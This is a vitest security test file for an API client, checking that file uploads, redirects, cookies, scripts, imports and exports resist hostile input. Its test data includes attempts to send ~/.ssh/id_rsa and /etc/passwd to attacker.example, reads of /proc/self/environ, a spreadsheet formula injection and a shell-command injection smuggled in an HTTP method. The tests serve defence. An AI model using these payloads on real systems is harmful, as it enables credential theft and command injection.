import http from 'node:http'
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { newCollection, newRequest } from '@shared/model'
import type { ExecOptions, ExecResult, PreparedRequest } from '@shared/types'
import { generateCode } from '@shared/codegen'
import { csvCell, maskUrlSecrets } from '@shared/engine/exports'
import { runCollection } from '@shared/engine/collectionRun'
import { createScriptRunner, type WorkerLike } from '@shared/engine/scriptRunner'
import type { ScriptOutcome, WorkerInbound, WorkerOutbound } from '@shared/engine/scriptTypes'
import { emptyScopes } from '@shared/engine/variables'
import { importText } from '@shared/importers'
import { importRisks } from '@shared/importers/risks'
import { CookieStore } from '../src/main/cookies'
import { FileAccess } from '../src/main/fileAccess'
import { executeRequest, setFileGuard } from '../src/main/http'

// Defences against hostile collections, scripts and servers.

const opts: ExecOptions = { timeoutMs: 5000, followRedirects: true, maxRedirects: 5, verifySsl: true, useCookieJar: false }
let n = 0
const prep = (url: string, body: PreparedRequest['body'] = { type: 'none' }, headers: [string, string][] = []): PreparedRequest => ({
  execId: `s${++n}`,
  method: 'POST',
  url,
  headers,
  body
})

let echo: http.Server
let other: http.Server
let echoUrl = ''
let otherUrl = ''
const dir = mkdtempSync(join(tmpdir(), 'ffcaller-sec-'))

beforeAll(async () => {
  const listen = async (s: http.Server): Promise<string> => {
    await new Promise<void>((r) => s.listen(0, '127.0.0.1', r))
    return `http://127.0.0.1:${(s.address() as { port: number }).port}`
  }
  const reply = (req: http.IncomingMessage, res: http.ServerResponse): void => {
    const chunks: Buffer[] = []
    req.on('data', (c: Buffer) => chunks.push(c))
    req.on('end', () => {
      res.setHeader('content-type', 'application/json')
      res.end(JSON.stringify({ headers: req.headers, body: Buffer.concat(chunks).toString('utf8') }))
    })
  }
  other = http.createServer(reply)
  otherUrl = await listen(other)
  echo = http.createServer((req, res) => {
    if (req.url === '/away') {
      res.writeHead(307, { location: `${otherUrl}/landed` })
      return res.end()
    }
    reply(req, res)
  })
  echoUrl = await listen(echo)
  writeFileSync(join(dir, 'upload.txt'), 'file contents')
})

afterAll(() => {
  echo?.close()
  other?.close()
  setFileGuard(async (p) => p)
  rmSync(dir, { recursive: true, force: true })
})

const sentBody = (r: ExecResult): string => {
  if (!r.ok) throw new Error(r.error.message)
  return JSON.parse(Buffer.from(r.response.body).toString('utf8')).body
}

describe('files that requests upload', () => {
  it('reads a file the guard allows, from the path it returns', async () => {
    setFileGuard(async () => join(dir, 'upload.txt'))
    expect(sentBody(await executeRequest(prep(echoUrl, { type: 'file', path: 'anything' }), opts))).toBe('file contents')
  })

  it('sends nothing when the guard refuses', async () => {
    setFileGuard(async (p) => {
      throw new Error(`no: ${p}`)
    })
    const r = await executeRequest(prep(echoUrl, { type: 'file', path: join(dir, 'upload.txt') }), opts)
    expect(r.ok).toBe(false)
  })

  it('never reads network paths, system pseudo-files or directories', async () => {
    let asked = 0
    setFileGuard(async (p) => (asked++, p))
    for (const path of ['\\\\attacker.example\\share\\x', '//attacker.example/share/x']) {
      const r = await executeRequest(prep(echoUrl, { type: 'file', path }), opts)
      expect(r.ok).toBe(false)
      if (!r.ok) expect(r.error.message).toContain('network shares')
    }
    expect(asked).toBe(0)
    const dirResult = await executeRequest(prep(echoUrl, { type: 'multipart', fields: [{ name: 'f', filePath: dir }] }), opts)
    expect(dirResult.ok).toBe(false)
    if (process.platform === 'linux') {
      const r = await executeRequest(prep(echoUrl, { type: 'file', path: '/proc/self/environ' }), opts)
      expect(r.ok).toBe(false)
      if (!r.ok) expect(r.error.message).toContain('System files')
    }
  })
})

describe('history', () => {
  it('masks credentials in the URL that was sent', () => {
    expect(maskUrlSecrets('https://api.test/v1/items?api_key=0123456789abcdef&page=2#frag')).toBe(
      'https://api.test/v1/items?api_key=••••cdef&page=2#frag'
    )
    expect(maskUrlSecrets('https://api.test/?Token=short&X-Access-Token=abcdefghijkl&q=x')).toBe(
      'https://api.test/?Token=••••&X-Access-Token=••••ijkl&q=x'
    )
    expect(maskUrlSecrets('https://me:s3cret@api.test/path?sig=abc')).toBe('https://me:••••@api.test/path?sig=••••')
    expect(maskUrlSecrets('https://api.test/users?name=ada&monkey=1&flag')).toBe('https://api.test/users?name=ada&monkey=1&flag')
    expect(maskUrlSecrets('https://api.test/plain')).toBe('https://api.test/plain')
  })
})

describe('the upload allow-list', () => {
  it('forgets files that no longer exist', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'ffc-allow-'))
    const kept = join(dir, 'kept.txt')
    writeFileSync(kept, 'x')
    const file = join(dir, 'allowed-files.json')
    writeFileSync(file, JSON.stringify([kept, join(dir, 'gone.txt'), 42]))
    const access = new FileAccess(file)
    await access.load()
    expect(await access.check(kept, async () => false)).toBe(true)
    expect(await access.check(join(dir, 'gone.txt'), async () => false)).toBe(false)
    expect(JSON.parse(readFileSync(file, 'utf8'))).toEqual([kept])
    rmSync(dir, { recursive: true, force: true })
  })
})

describe('redirects', () => {
  it('drop credentials when the origin changes, and keep other headers', async () => {
    const r = await executeRequest(
      prep(`${echoUrl}/away`, { type: 'text', text: 'x' }, [
        ['Authorization', 'Bearer secret'],
        ['X-Api-Key', 'k'],
        ['Cookie', 'a=b'],
        ['X-Trace', 'keep']
      ]),
      opts
    )
    if (!r.ok) throw new Error(r.error.message)
    const { headers } = JSON.parse(Buffer.from(r.response.body).toString('utf8'))
    expect(headers.authorization).toBeUndefined()
    expect(headers['x-api-key']).toBeUndefined()
    expect(headers.cookie).toBeUndefined()
    expect(headers['x-trace']).toBe('keep')
  })
})

describe('cookie jar', () => {
  it('refuses cookies for a public suffix but keeps intranet hosts working', async () => {
    const jar = new CookieStore()
    await jar.storeFromResponse('https://evil.github.io/', ['wide=1; Domain=github.io'])
    expect(await jar.getCookieHeader('https://victim.github.io/')).toBe('')
    await jar.storeFromResponse('http://intranet/', ['a=1; Domain=intranet', 'b=2'])
    expect(await jar.getCookieHeader('http://intranet/')).toBe('a=1; b=2')
    await jar.storeFromResponse('http://localhost:3000/', ['c=3; Domain=localhost'])
    expect(await jar.getCookieHeader('http://localhost:3000/')).toBe('c=3')
  })
})

describe('what a script sends back', () => {
  it("can't make a request upload a file", async () => {
    const sent: PreparedRequest[] = []
    const request = newRequest({ name: 'R', url: 'http://x', scripts: { preRequest: 'forge', test: '' } })
    await runCollection({
      collection: newCollection(),
      items: [{ request, parents: [] }],
      scopes: emptyScopes(),
      options: { iterations: 1, delayMs: 0, bail: false, opts, scriptTimeoutMs: 1000 },
      deps: {
        send: async (req) => (sent.push(req), { ok: false, error: { message: 'stop' } }),
        runScripts: async (job): Promise<ScriptOutcome> => ({
          scopes: job.scopes,
          request: {
            ...job.request,
            url: 'https://attacker.example/',
            body: {
              ...job.request.body,
              mode: 'binary',
              binaryPath: '/home/me/.ssh/id_rsa',
              formdata: [{ id: 'f', key: 'k', value: '', enabled: true, kind: 'file', files: ['/etc/passwd'] }]
            }
          },
          tests: [],
          logs: []
        })
      }
    })
    expect(sent).toHaveLength(1)
    expect(sent[0].url).toBe('https://attacker.example/')
    expect(sent[0].body.type).not.toBe('file')
    expect(JSON.stringify(sent[0])).not.toContain('id_rsa')
  })

  it('keeps only well-formed variables, tests and logs', async () => {
    const forged = {
      scopes: { globals: { ok: 'yes', bad: { x: 1 } }, collection: 'nope', environment: { n: 5, s: 's' }, data: {}, local: {} },
      request: { id: 'r' },
      tests: [{ name: 'a', passed: 1 }, { nope: true }],
      logs: [{ level: 'shout', message: 'hi' }, 'junk']
    }
    const worker: WorkerLike & { cb?: (m: WorkerOutbound) => void } = {
      postMessage: (m: WorkerInbound) => m.type === 'run' && worker.cb?.({ type: 'done', outcome: forged as never }),
      onMessage: (cb) => void (worker.cb = cb),
      onError: () => {},
      terminate: () => {}
    }
    const run = createScriptRunner({ spawn: () => worker, send: async () => ({ ok: false, error: { message: '' } }) })
    const scopes = { ...emptyScopes(), collection: { keep: 'me' } }
    const out = await run({ phase: 'test', scripts: [{ label: 'x', code: 'x' }], request: { id: 'r', name: 'r', method: 'GET', url: '', headers: [], body: newRequest().body }, scopes }, 1000, opts)
    expect(out.scopes.globals).toEqual({ ok: 'yes' })
    expect(out.scopes.collection).toEqual({ keep: 'me' })
    expect(out.scopes.environment).toEqual({ s: 's' })
    expect(out.tests).toEqual([{ name: 'a', passed: false }])
    expect(out.logs).toEqual([{ level: 'log', message: 'hi', source: '' }])
  })
})

describe('imports', () => {
  it('count scripts and file uploads before anything is saved', () => {
    const result = importText(
      JSON.stringify({
        info: { name: 'Shared', schema: 'https://schema.getpostman.com/json/collection/v2.1.0/collection.json' },
        event: [{ listen: 'prerequest', script: { exec: ['console.log(1)'] } }],
        item: [
          { name: 'Upload', request: { method: 'POST', url: 'http://x', body: { mode: 'formdata', formdata: [{ key: 'f', type: 'file', src: '/home/me/.ssh/id_rsa' }] } } },
          { name: 'Plain', request: { method: 'GET', url: 'http://x' }, event: [{ listen: 'test', script: { exec: ['pm.test("x", () => {})'] } }] }
        ]
      })
    )
    expect(importRisks([result])).toEqual({ scripts: 2, files: ['/home/me/.ssh/id_rsa'] })
    expect(importRisks([importText(JSON.stringify({ info: { name: 'Safe', schema: 'https://schema.getpostman.com/json/collection/v2.1.0/collection.json' }, item: [] }))])).toEqual({ scripts: 0, files: [] })
  })
})

describe('exports', () => {
  it('keep spreadsheet formulas from running, numbers stay numbers', () => {
    expect(csvCell('=HYPERLINK("http://x","y")')).toBe(`"'=HYPERLINK(""http://x"",""y"")"`)
    expect(csvCell('@SUM(A1)')).toBe("'@SUM(A1)")
    expect(csvCell('+cmd')).toBe("'+cmd")
    expect(csvCell('-5')).toBe('-5')
    expect(csvCell('+3.5e2')).toBe('+3.5e2')
    expect(csvCell(-5)).toBe('-5')
    expect(csvCell('plain')).toBe('plain')
  })

  it('quote a method that is not a plain name in shell snippets', () => {
    const method = "GET;$'\\163\\150' -c id"
    const req = { method, url: 'http://x', headers: [] as [string, string][], body: { type: 'none' as const } }
    expect(generateCode('curl', req)).toContain(`--request 'GET;$'\\''\\163\\150'\\'' -C ID'`)
    expect(generateCode('httpie', req)).toMatch(/^http 'GET;/)
    expect(generateCode('curl', { ...req, method: 'PATCH' })).toContain('--request PATCH')
  })
})
